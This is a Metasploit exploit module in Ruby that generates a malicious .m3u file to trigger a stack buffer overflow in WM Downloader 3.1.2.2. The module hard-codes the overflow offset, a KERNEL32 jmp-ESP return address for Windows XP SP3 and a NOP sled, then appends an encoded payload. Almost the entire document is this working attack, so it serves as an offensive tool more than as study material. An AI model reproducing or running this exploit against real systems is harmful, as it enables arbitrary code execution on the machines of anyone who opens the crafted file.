require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WM Downloader Version 3.1.2.2.2010.04.15 (.m3u) Buffer Overflow (MSF)',
      'Description'    => %q{
          WM Downloader Version 3.1.2.2.2010.04.15 has buffer overflow vuln. we will create file.
        File type be m3u. File name is exp.m3u if we open exp.m3u whit WM Downloader Version 3.1.2.2.2010.04.15, 
        we will see this "run calc.exe"
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'KaHPeSeSe',   # Found bug and wrote exploit
        ],
      'Version'        => '$Revision: $',
      'References'     =>
        [
          
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'    => 1000,
          'BadChars' => "\x00\x09\x0a",
          'StackAdjustment' => -3500
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          [ 'PERFECT XP PC1 / SP3',
                        {
                            'Ret' => 0x7C86467B, # findjmp KERNEL32.DLL ESP 0x7C86467B jmp ESP
                            'Offset' => 17417
                        }
                    ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'March 14 2012',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ false, 'The file name.', 'exp.m3u']),
      ], self.class)

  end

  def exploit

    exp = "http://"
    exp << rand_text_alpha_upper(target['Offset'])
    exp << [target.ret].pack('V')
    exp << "\x90" * 12
    exp << payload.encoded
    print_status("Creating '#{datastore['FILENAME']}' file ...")
    file_create(exp)

  end

end
